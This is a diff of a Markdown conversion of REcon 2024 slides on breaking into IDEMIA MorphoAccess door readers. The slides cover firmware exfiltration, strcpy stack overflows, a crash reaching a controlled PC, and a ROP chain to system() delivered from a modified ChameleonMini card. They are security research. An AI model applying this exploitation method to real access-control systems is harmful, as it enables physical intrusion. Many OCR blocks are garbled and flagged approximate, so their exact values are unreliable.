@@ -8,19 +8,24 @@ year: 2024
 source_pdf: "Recon 2024_Slides/Lucas GEORGES_Open Sesame stack smashing your way into opening doors.pdf"
 pages: 65
 sha256: "fa194aa06e9ba5e7b621fbe65a7cf0e255d652fbd7d08fcb38eff6e49a693ab5"
-text_chars: 38669
-ocr_pages: 23
+text_chars: 34623
+ocr_pages: 22
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.6
+ocr_unreliable_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:30:15Z"
+converted_at: "2026-08-12T06:17:44Z"
 ---
 # Open Sesame stack smashing your way into opening doors
 
 **Speakers:** Lucas GEORGES  
 **Conference:** REcon 2024  
 **Source:** `Recon 2024_Slides/Lucas GEORGES_Open Sesame stack smashing your way into opening doors.pdf` (65 pages)
+
 
 ## Slide 1
 
@@ -222,14 +227,14 @@ PUBLIC
 
 #### Firmware Analysis
 
-```
+\```
 $ binwalk -E firmware/Firmware-upgrade-malite-plus.4.9.4-prod.bin
 DECIMAL       HEXADECIMAL     ENTROPY
-```
+\```
 
-```
+\```
 0             0x0             Rising entropy edge (0.999458)
-```
+\```
 
 **12**
 
@@ -239,7 +244,7 @@ PUBLIC
 
 # **<u>Reversing</u>** Firmware Analysis
 
-```
+\```
 $ hexdump -C firmware/Firmware-upgrade-malite-plus.4.9.4-prod.bin | head
 00000000  4d 41 46 57 01 00 00 00  53 61 6c 74 65 64 5f 5f  |MAFW....Salted__|
 00000010  cc c2 8d e2 0b 8b 19 3a  1b 24 36 ee 4b 3f 13 19  |.......:.$6.K?..|
@@ -251,7 +256,7 @@ $ hexdump -C firmware/Firmware-upgrade-malite-plus.4.9.4-prod.bin | head
 00000070  83 a4 d6 4d 4b 66 48 ba  d6 1e 42 cf 86 84 28 9e  |...MKfH...B...(.|
 00000080  36 b4 62 91 19 e0 84 c3  eb 79 97 93 65 d3 11 d5  |6.b......y..e...|
 00000090  8b ec c5 c2 8f e0 09 b9  56 a8 5a fb af f9 25 65  |........V.Z...%e|
-```
+\```
 
 **13**
 
@@ -263,21 +268,21 @@ PUBLIC
 
 Upgrader
 
-```
+\```
 PS \> C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -h
 MorphoAccess SIGMA Upgrade Tool. Copyright ® IDEMIA Identity & Security France 2016-2019.
-```
+\```
 
-```
+\```
 Options:
-```
+\```
 
-```
+\```
   -h [ --help ]                 Displays help and exit without upgrading
                                 firmware.
-```
+\```
 
-```
+\```
   -v [ --verbose ]              Enables verbose mode.
   -q [ --quiet ]                Enable quiet mode.
   -f [ --file ] arg             Path to the binary file used for upgrade.
@@ -286,24 +291,24 @@ Options:
   -t [ --timeout ] arg (=10000) Connection timeout in milliseconds.
   --log arg                     Append timestamped application output to the
                                 specified log file.
-```
+\```
 
-```
+\```
 Examples:
-```
+\```
 
-```
+\```
     C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -f new_firmware.bin -e 192.168.1.2
         Upgrades firmware of terminal at address 192.168.1.2 using file new_firmware.bin
-```
+\```
 
 - `C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -f new_firmware.bin -e 192.168.1.2 -t 15000 as above, using a timeout of 15 seconds.`
 
 - `C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -v -f new_firmware.bin -e 192.168.1.2 as above, enabling using verbose mode.`
 
-```
+\```
 Return codes:
-```
+\```
 
 - `0: The terminal firmware has been successfully updated.`
 
@@ -335,22 +340,18 @@ Upgrader
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Reversing
 Upgrader
 Choose segment to jump
-|
-ro
 Name
-vidata_
 .idata
 -idata_
 ppnurban
 akzdibcw
-.pdata
--taggant
 Line 5 of 9
 Start
 0000000140001000
@@ -423,7 +424,6 @@ ds
 0001
 0001
 0001
-& OYNACKTIV
 fs
 FFFFF...
 FFFFF...
@@ -444,7 +444,6 @@ FFFFFFFFF...
 FFFFFFFFF...
 FFFFFFFFF...
 FFFFFFFFF...
-PUBLIC
 15
 ```
 
@@ -468,31 +467,24 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Reversing
 Fake server
-PUBLIC
 Process Entry
-v
 .text unpacking
 by themida
-i
-main)
 connect
-v
 loading
 firmware
-¥
 decrypting
 firmware
 upgrade
 state machine
 v
 untar archive
-& OYNACKTIV
-7
 ```
 
 ## Slide 18
@@ -505,18 +497,16 @@ PUBLIC{height=75%}
 
 **18**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Reversing
 Results
-EE Windows PowerShell
 > | exfiltrate_firmware
 | Fite | Home
 4
 gh Quick access
-Desktop
-4} Downloads
 =| Documents
 = Pictures
 blogpost
@@ -538,36 +528,18 @@ exfiltrated_KERNEL_A.bin
 exfiltrated_KERNEL_B.bin
 exfiltrated_MAP_TABLE.bin
 _| exfiltrated_UBIFS_A.bin
-F\XFF\ KFF\ FF KF KFF\ KFF FF FF KF
-XFFE\XFF\XFF\XFF
 ®x4000 bytes of data
 16399
-: 0x31234
-\xO0@\x00\ xOO\ xFF\ xFF\ xFF\ XFF\ X FF KF
-XFF\XFFE\XFF\KFFN KFFA KF FA KFFA FFA KF
-XFF\XFFE\ KF FA XFF
 ®x4000 bytes of data
 1623
-0x31234
-H\x06\xO0\xO0\ xFF\ xFF\ xFF\ XFF\ KFA XF
-XFF\XFF\ XFF\ KFF\ FF KF FA KF FA KFA KF
-F\XFF\ KF EY FFA FF KEN KF FFA KF KF
-XFF\ XFF\ KF FA XFF
 ®x648 bytes of data
--
-: 0x141234
 43
-: 6x91234
-bootnumber\x00\x00\x00\x60\ x60\ x00\ x
-: oe x T\RUU \XO0\ x00\x00\x00\x00\x00\x80\x00\ x00
 Finalizing upgrade session 3/3. Please wait. \xo00\ 60\x00\x60'
 Upgrade session 3/3 completed. [UPGRADE] len(data) : 7
 Requesting terminal reboot in normal mode. Please wait. [UPGRADE] message type : 9x81234
 The terminal firmware has been successfully updated. [UPGRADE] message : b''
 Ps C:\Users\User>
 fheight=75%}
-Uoe COMPLELeU
-& SYNACKTIV
 18
 ```
 
@@ -581,90 +553,28 @@ Uoe COMPLELeU
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Reversing
 Contactless card reversing
-PUBLIC
-[7] sub_3F5C30
-[F| sub_3F5C70
-[7] sub_3F5D08
-[7] sub_3F5D48
-[7] sub_3F5D88
 [F] Desfire_ComputeCmac_
-[7] sub_3F6088
-[F) Desfire_VerifyCmacRecv
 [| sub_3F61D4
 [F) Desfire_Command
 [F) sub_3F6338
 [F) sub_3F638C
 [7] sub_3F6608
-[7] sub_3F69FC
-[7] sub_3F6A04
-[Ff] sub_3F6A18
-[F] sub_3F6A20
-[F)| TDES_Init
-[F)| sub_3F6A7C
 [| sub_3F6AB4
-[F) sub_3F6AC8
-[F)| sub_3F6B04
 [7] sub_3F6B18
-[Ff] CreateStdDataFile
-[F] Desfire_CreatelsoStdDataFile
-[F] Desfire_CreateBackupDataFile
-[F] Desfire_CreatelsoBackupDataFile
-[7 Desfire_CreateValueFile
-[F) Desfire_CreateLinearRecordFile
-[Ff] Desfire_CreatelsoLinearRecordFile
 [F) Desfire_CreateCyclicRecordFile
-[Ff] Desfire_CreatelsoCyclicRecordFile
-[F] Desfire_DeleteFile
-[Ff] Desfire_GetFileSettings
-FF_Macfira ChannakilaSattinac
 4
 Line 10638 of 10638
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-text
-tavt
 003F5C30
 003F5C70
 003F5D08
 003F5D48
 003F5D88
-O03F5EC4
 003F6088
 003F613C
 003F61D4
@@ -672,14 +582,10 @@ O03F5EC4
 003F6338
 003F638C
 003F6608
-O003F69FC
 003F6A04
 003F6A18
 003F6A20
 003F6A34
-OO03F6A7C
-O03F6AB4
-003F6AC8
 003F6B04
 003F6B18
 003F6BA0
@@ -687,26 +593,20 @@ O03F6AB4
 003F6C94
 003F6D0C
 003F6D88
-003F6E70
-003F6FO0
-O03F6F94
 003F7024
 003F70B8
 003F70F8
-Nn2F7200
 00000038
 00000038
 00000038
 00000038
 00000134
 000001B4
-000000AC
 00000090
 00000034
 00000120
 00000054
 00000278
-000003FO
 00000008
 00000014
 00000008
@@ -721,20 +621,12 @@ Nn2F7200
 00000074
 00000070
 00000074
-O00000E0
 00000088
 0000008C
 00000088
 0000008C
 00000038
 00000200
-anannnre
-oC
-oC
-oC
-oc
-oc
-oC
 oC
 oC
 oC
@@ -745,18 +637,12 @@ oC
 oC
 oC
 oc
-oc
-oC
-oc
-oC
-oC
 oC
 oC
 oC
 oC
 oc
 ae
-SYNACKTIV
 19
 ```
 
@@ -784,16 +670,14 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Hardware
 USB for WiFi dongle
-3 , inci
 USB OTG )
-woDain-am
 RS484
-PUBLIC
 NAND
 IGDID NW190 Microns
 Application Processor
@@ -802,7 +686,6 @@ CTAP2042
 RAM
 QUAH7 D9XCF Microns
 Contactless sensor
-& OYNACKTIV
 22
 ```
 
@@ -810,16 +693,16 @@ Contactless sensor
 
 # **<u>Hardware</u>**
 
-```
+\```
 U-Boot 2014.04-svn3586 (May 25 2021 - 02:12:30)
 CPU:   Freescale i.MX6SOLO rev1.1 at 792 MHz
 CPU:   Temperature 22 C, calibration data: 0x59951069
 Reset cause: POR
 Board: MX6S MALITES
 Ma1000 Hardware config Alpha(V1) (0x3f)
-```
+\```
 
-```
+\```
 DRAM:  512 MiB
 NAND:  512 MiB
 MMC:   FSL_SDHC: 0
@@ -831,21 +714,21 @@ Net:   CPU Net Initialization Failed
 No ethernet found.
 Signature data len=8144 ... OK
 Retrofit successful
-```
+\```
 
-```
+\```
 morphosb_secureboot bootnb=0 binnb=7
 Signature data len=40689 ... OK
-```
+\```
 
-```
+\```
 Authenticate uImage from DDR location 0x10007fc0...
 Secure boot enabled
 HAB Configuration: 0xcc, HAB State: 0x99
 No HAB Events Found!
-```
+\```
 
-```
+\```
 ## Booting kernel from Legacy Image at 10007fc0 ...
    Image Name:   Linux-4.1.15
    Image Type:   ARM Linux Kernel Image (uncompressed)
@@ -856,7 +739,7 @@ No HAB Events Found!
    Booting using the fdt blob at 0x11000000
    XIP Kernel Image ... \0   Loading Device Tree to 2e146000, end 2e152e28 ... OK
 Starting kernel ...
-```
+\```
 
 **23**
 
@@ -878,22 +761,20 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Boot
 Boot Process
-PUBLIC
 NAND
 MAP_TABLE
 CPU RESET
-3
 Boot ROM
 RAM
 LMX6 HAB
 BOOTLOADER A
 BOOTLOADER B
-KERNEL A
 DTB_A
 KERNEL B
 UBIFS_A
@@ -903,17 +784,11 @@ U-Boot bootlader
 MAP_TABLE
 Partition Check
 on error,
-—T
 Partition Check
-—
 Secure Boot Check
-po
 Partition Load [7
 Secure Boot Check
-[sox |
 Linux entry point
-KERNEL A
-SYNACKTIV
 25
 ```
 
@@ -931,12 +806,12 @@ Partition Check
 
 ###### **Hardcoded 1024 bit RSA Key**
 
-```
+\```
 RSA Public-Key: (1024 bit)
 Modulus:
-```
+\```
 
-```
+\```
 00:c2:3f:3a:77:ff:c7:65:28:60:1d:cd:ec:45:6c:
 a6:a5:9a:c4:aa:c9:89:51:88:b1:a4:3f:1a:07:27:
 15:c8:c0:30:bd:84:4f:cd:8b:43:97:b5:aa:d9:ff:
@@ -947,7 +822,7 @@ eb:59:3a:90:b2:31:a2:54:08:a9:75:10:06:05:74:
 d9:9e:ca:4f:63:8d:86:d8:af:92:e9:46:dc:4b:57:
 93:ab:4b:a8:ee:c7:22:e4:43
 Exponent: 65537 (0x10001)
-```
+\```
 
 **26**
 
@@ -971,7 +846,8 @@ Boot process
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Upgrade mode
@@ -979,7 +855,6 @@ Boot process
 LZ kernel
 Uncompressing kernel ...
 padding
-PUBLIC
 Linux version 4.1.15
 (g509649@debian8-ma5g)
 (gcc version 4.9.3 (GCC) )
@@ -987,7 +862,6 @@ Linux version 4.1.15
 Tue May 25 02:14:59 CEST 2021
 initramfs cpio
 Izo + cpio
-& OYNACKTIV
 rootfs
 discovery_app
 mep_sr
@@ -1016,26 +890,25 @@ PUBLIC
 
 # **<u>Upgrade mode</u>**
 
-```
+\```
 mep_sr
-```
+\```
 
 **30**
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Upgrade mode
-PUBLIC
 mep_sr
 *(int (_fastcall **) (void *, int
 while (1 )
 buf, 0xA00000, &
 break;
 if (v4l)
-{
 = j_slave_getmsginfo(morpho_msgbuf,
 int *))((char *)&word_10 + ha
 38 && *(int *) ((char *)&dword_14 + handler) && *(_DWORD
@@ -1044,13 +917,10 @@ printf ("slave_getmsginfo returned %i\n", v41);
 _send_to_client((int (__fastcall **) (char *
 }
 else if ( LOWORD(msg[0]) == 0x1234 )
-{
 switch ( HIWORD (r
-{
 case 1:
 puts
 if (
-[0]) )
 1)
 v46 = j_morphosr_session_retrofitbin (&v72,
 else
@@ -1070,7 +940,6 @@ printf ("--- Setflag, str = %s,
 v46 = _set_flag(s2, (int)v69);
 goto LABEL_106;
 jler,
-c
 -- Getflag ---");
 flag = _get_flag(s2, &v69)
 if ( flag )
@@ -1083,14 +952,10 @@ size, msg);
 *
 int, char *)) (har
 int) ) (handler
-dler) ;
-*) &byte_9 [handler
 , int)) (handler + 20), -1012);
 handler, handler, 0);
 + 20),
-+3) )
 0);
-SYNACKTIV
 30
 ```
 
@@ -1144,21 +1009,19 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Upgrade mode
 Parameter Zone
-PUBLIC
 BANK A BANK B
-inka oN
 mep_sr
 init.d
 core_app
 set_macaddress.sh set_hostname.sh
 —
 Terminal_InfoTest
-libmep_secure_retrofit.so
 config_network.sh
 wpa_passphrase
 usb_gadget_commands_args
@@ -1170,7 +1033,6 @@ discovery_app
 tinfo
 libTerminalinfo.so libTerminalinfo.so
 ParamZone
-& OYNACKTIV
 33
 ```
 
@@ -1200,21 +1062,21 @@ PUBLIC
 
 ###### **Example:**
 
-```
+\```
 int __fastcall check_device_information(
 constchar *arg_part_number,
 constchar *arg_firmware_version,
 constchar *arg_hardware_version
 )
 {
-```
+\```
 
-```
+\```
 char min_dwngd_version[48]; // [sp+10Ch] [bp-120h] BYREF
 char min_firmware_version[48]; // [sp+140h] [bp-ECh] BYREF
 int pkg_part_number[12]; // [sp+174h] [bp-B8h] BYREF
 int cie_part_number[12]; // [sp+1A8h] [bp-84h] BYREF
-```
+\```
 
 - `// get_device_information() source from PARAMETER_ZONE that we control`
 
@@ -1232,36 +1094,36 @@ Parameter Zone
 
 ##### **Example:**
 
-```
+\```
 int __fastcall get_device_information(constchar *value, char *output_buffer)
 {
-```
+\```
 
-```
+\```
     field_list_value tmp;
-```
+\```
 
-```
+\```
     v2 = strlen(value);
     tmp.key = (int)malloc(v2 + 1);
 if ( !tmp.key )
-```
+\```
 
-```
+\```
 returnprintf(”Null pointer %s %d \n”, ”get_device_information”, 410);
 strcpy((char *)tmp.key, value);
-```
+\```
 
-```
+\```
 if ( !get_field_list((int)&tmp, 1) )
     {
 if ( tmp.value )
-```
+\```
 
-```
+\```
 // tmp.value is controlled, output_buffer is a stack buffer.
 strcpy(output_buffer, (constchar *)tmp.value);
-```
+\```
 
 **36**
 
@@ -1273,7 +1135,7 @@ PUBLIC
 
 #### Exploitation
 
-```
+\```
 (qiling_env) $ python emulate.py
 Upgrading firmware application
 morphosr_session_init
@@ -1288,9 +1150,9 @@ HW versions to upgrade:88,99, Current CIE_PIN:88
 ERROR:Product nos. to upgrade:, Current product number:AAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-```
+\```
 
-```
+\```
 [x] [Thread 2000]       CPU Context:
 [x] [Thread 2000]       r0      : 0x12
 [x] [Thread 2000]       r1      : 0x0
@@ -1305,15 +1167,15 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [x] [Thread 2000]       cpsr    : 0x600101f3
 [x] [Thread 2000]       c1_c0_2 : 0x0
 [x] [Thread 2000]       c13_c0_3: 0x9035ba40
-```
+\```
 
-```
+\```
 [x] [Thread 2000]       fpexc   : 0x40000000
-```
+\```
 
-```
+\```
 [x] [Thread 2000]       PC = 0x41414140 (unreachable)
-```
+\```
 
 **37**
 
@@ -1403,12 +1265,12 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Springprox SDK
 € > CGC) @ springcard.com/en/download/sdks
-springcard®
 HOME PRODUCTS SERVICES USECASES ABOUT |Q
 Downloads: SDKs & tools for developers
 Previous versions are hidden [Show]
@@ -1422,17 +1284,14 @@ SDK for ROR
 kb
 SDK for all RDR products (FunkyGate-IP NFC, FunkyGate-DW NFC)
 SpringProx SDK, for CSB4, K632, K663, Prox'N'Drive...
-&  springprox-sdk_1-80.zip 1-80 18/09/2015 7027
+& springprox-sdk_1-80.zip 1-80 18/09/2015 7027
 kb
 SDK for SpringProx-CF and SpringProx-CF-UP
-&  springprox-ppc-sdk_1-50.zip 1-50 18/09/2015 6810
+& springprox-ppc-sdk_1-50.zip 1-50 18/09/2015 6810
 kb
-&  springprox-ppe-sdk_1-46.exe 1-46 26/01/2016 6333
 kb
-PUBLIC
 SDK for mobile products : SpringProx-CF, SpringProx-RC, SpringWAP.
 SDK SpringProx API (CSB Legacy, K531/K632)
-SYNACKTIV
 43
 ```
 
@@ -1446,7 +1305,8 @@ SYNACKTIV
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Desfire command list
@@ -1467,9 +1327,7 @@ Card level configuration
 Change a key
 Returns a key version byte
 ca | Create Application
-0A | Delete Applicaton
 6A | Get Applications IDs
-6 |Free Memory
 60 | GetDFNames
 45 |Get KeySettings
 5a | Select Application
@@ -1489,12 +1347,10 @@ Get the read ID for the card (can be set so a random ID is used as
 part of collision detection, rather than the real ID).
 Application level commands
 6F | Get FilelDs
-61 | Get Fitelbs 1so)
 F5 | Get FileSettings
 oF | Change FileSettings
 CD | Create StdDataFile
 = | Create BackupDataFile
-PUBLIC
 Geta list of file IDs
 Get a list of ISO file IDs
 Get file settings for a specific existing file
@@ -1522,7 +1378,6 @@ BB | Read Records Read records from a linear or cyclic record file
 EB | Clear RecordFile Clear a linear or cyclic record file
 C7 | Commit Transaction Commit writes to backup, value, or record files
 A? | Abort Transaction Discard writes to backup, value, or record files
-SYNACKTIV
 ```
 
 ## Slide 45
@@ -1535,14 +1390,12 @@ SYNACKTIV
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Springprox SDK
-PUBLIC
-[7
 SPROX_API_FUNC(Desfire_GetVersion) (SPROX_PARAM DF_VERSION_INFO *pVersionInfo)
-{
 DWORD recv_length = 1;
 BYTE recv_buffer[256];
 SPROX_RC status;
@@ -1553,8 +1406,6 @@ memset(pVersionInfo, ®, sizeof(DF_VERSION_INFO) ) ;
 ctx->xfer_length = 0;
 ctx->xfer_buffer[ctx->xfer_length++] = DF_GET_VERSION;
 for (;;)
-{
-& OYNACKTIV
 status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P @, COMPUTE_COMMAND_CMAC | WANTS_ADDITIONAL_FRAME |
 WANTS_OPERATION_OK) ;
 if (status != DF_OPERATION_OK)
@@ -1577,26 +1428,22 @@ ctx->xfer_length = 1;
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Nominal mode SYNACKTIV
 Springprox SDK
-PUBLIC
-ae]
 SPROX_API_FUNC(Desfire_GetVersion) (SPROX_PARAM DF_VERSION_INFO *pVersionInfo)
-{
 DWORD recv_length = 1;
 [BYTE recv_buffer [256];
 SPROX_RC status;
 SPROX_DESFIRE_GET_CTX();
 if (pVersionInfo != NULL)
-memset (pVersionInfo, @, sizeof(DF_VERSION_INFO) ) ;
 /* create the info block containing the command code */
 ctx->xfer_length = 0;
 ctx->xfer_buffer[ctx->xfer_length++] = DF_GET_VERSION;
 for (;;)
-{
 status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P @, COMPUTE_COMMAND_CMAC | WANTS_ADDITIONAL_FRAME |
 WANTS_OPERATION_OK) ;
 if (status != DF_OPERATION_OK)
@@ -1620,23 +1467,21 @@ Springprox SDK
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Springprox SDK
 Same pattern, different vulnerability
-PUBLIC
 SPROX_API_FUNC(Desfire_ReadDataEx) (SPROX_PARAM BYTE read_command, BYTE
 file_id, BYTE comm_mode, DWORD from_offset, DWORD item_count, DWORD item_size,
 BYTE data[], DWORD *done_size)
-{
 //
 [xrecv_buffer = malloc(buffer_size) ;
 if (recv_buffer == NULL)
 return DFCARD_OUT_OF_MEMORY;
 recv_buffer[recv_length++] = DF_OPERATION_OK;
 for (;;)
-{
 status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P 2,
 COMPUTE_COMMAND_CMAC | FAST_CHAINING_ALLOWED | WANTS_ADDITIONAL_FRAME
 WANTS_OPERATION_OK) ;
@@ -1648,8 +1493,6 @@ recv_length += (ctx->xfer_length - 1);
 if (ctx->xfer_buffer[INF + @] != DF_ADDITIONAL_FRAME)
 break;
 ctx->xfer_length = 1;
-w~
-& OYNACKTIV
 41
 ```
 
@@ -1696,13 +1539,10 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
-PUBLIC
-eudocode
 1 lint _fastcall Desfire_GetVersion(_DWORD *a1)
 2
 3| size_t v2; // r4
@@ -1755,15 +1595,11 @@ int v8; // x
 49| al[2] = v8;
 _buffer[17];
 50 *(_DWORD *)&érecv_buffer[13];
-51 *("DWORD *)&érecv_buffer[21];
-52 *("DWORD *)&érecv_buffer[25];
 54 °
 57| al[6] = vi2;
-58 @eturn-resu
 59 |}
 003E8528 Desfire_GetVersion:42 (3F8528)
 4
-SYNACKTIV
 51
 ```
 
@@ -1791,13 +1627,11 @@ PUBLIC
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
 Tooling
-PUBLIC
 PROXGRIND
 ChameleonTiny
 Professional
@@ -1811,7 +1645,6 @@ Version
 Pro (With Bluetoott
 Quantity
 NOTIFY ME WHEN IN STOCK
-& OYNACKTIV
 53
 ```
 
@@ -1825,14 +1658,11 @@ NOTIFY ME WHEN IN STOCK
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
 Opensource Firmware
-PUBLIC
- emsec/ChameleonMini
 Public
 Q Notifications & Fork 369
 <> Code © Issues 58 [1 Pullrequests 12 © Actions fF Projects OJ wiki © Security
@@ -1855,7 +1685,6 @@ DESFirelSO14443Support.h
 DESFirelSO7816Support.c
 DESFirelSO7816Support.h
 DESFireinstructions.c
-DESFireinstructions.h
 ChameleonMini / Firmware / Chameleon-Mini / Application / DESFire /
 Fix key read and write for keys with different numbers than zero
 Support Gallagher when using make desfire
@@ -1874,10 +1703,7 @@ Restore point for changes to the CLUCL2 exchanges in the anticollisi
 Restore point for changes to the CLUCL2 exchanges in the anticollisi
 Return correct error code when file index is out of range
 Several fixes to responsiveness and frozen behavior noted in PR #319
-WW Star 15k +
-lx Insights
 Go to file
-Y onOct 27,2022 History
 3 months ago
 3 months ago
 6 months ago
@@ -1895,7 +1721,6 @@ last year
 6 months ago
 3 months ago
 7 months ago
-SYNACKTIV
 54
 ```
 
@@ -1909,32 +1734,17 @@ SYNACKTIV
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-SYNACKTIV
-Exploitation
-Remote Code Execution
 Exploitation strategy
 STACK ROPCHAIN CORE_APP
 SP 00572A08 desfire_ctxt
 FF 00 00 OOsdeafire ctx DCR OxFF
-stuff s72a08 68 00 60 a0 pce
-06 09 00 o0+ poe
-66 00 00 a0+ Dep
-06 00 00 a0+ bea
-66 00 00 o0+ Dea
-AOS 00 00 00 ad+ Dee
-recv_buffer padding . 00 09 00 Go+ pce
-06 00 00 a0+ pon.
-6 09 00 o0+ pce
-60 00 00 a08 pon
-TC UT-00 OOF Pcs
 saved_pc gadget 1 =" POP {R3,R4,R11,PC} 6e G0 60 aot = ;
 A08 06 00 00 00+ poo
-ata:00372A08 00 00 00 00+ pcp :
 572R08 66 00 00 00+ Den :
-06 09 00 o0+ pce
 gadget 2 = "LDR RO, [R11,#-0x15C]"
 "BL system"
 PUBLIC 55
@@ -1952,13 +1762,11 @@ Remote Code Execution
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
 Exploitation strategy
-PUBLIC
 uint16_t EV0GmdGetVersioni(uint8_t *Buffer, uint16_t ByteCount) {
 DEBUG_PRINT_P(PSTR("EV@CmdGetVersion1 : DF_GET_VERSION_frame_counter
 DF_GET_VERSION_frame_counter) ;
@@ -1970,7 +1778,6 @@ Buffer[®] = STATUS_ADDITIONAL_FRAME ;
 // Buffer[7] = Picc.HwProtocolType;
 memset (&Buffer[1], @x42, @x@8);
 if (DF_GET_VERSION_frame_counter <= 33)
-{
 DF_GET_VERSION_frame_counter+=1;
 DesfireState = DESFIRE_GET_VERSION1;
 return 9; // bytes length
@@ -1978,7 +1785,6 @@ DF_GET_VERSION_frame_counter=0;
 DesfireState = DESFIRE_GET_VERSION2;
 return 9;
 -- %d\n"),
-& OYNACKTIV
 ```
 
 ## Slide 57
@@ -1993,14 +1799,12 @@ Remote Code Execution
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
 Exploitation strategy
 uint16_t EV@CmdGetVersion2(uint8_t *Buffer, uint16_t ByteCount) {
-PUBLIC
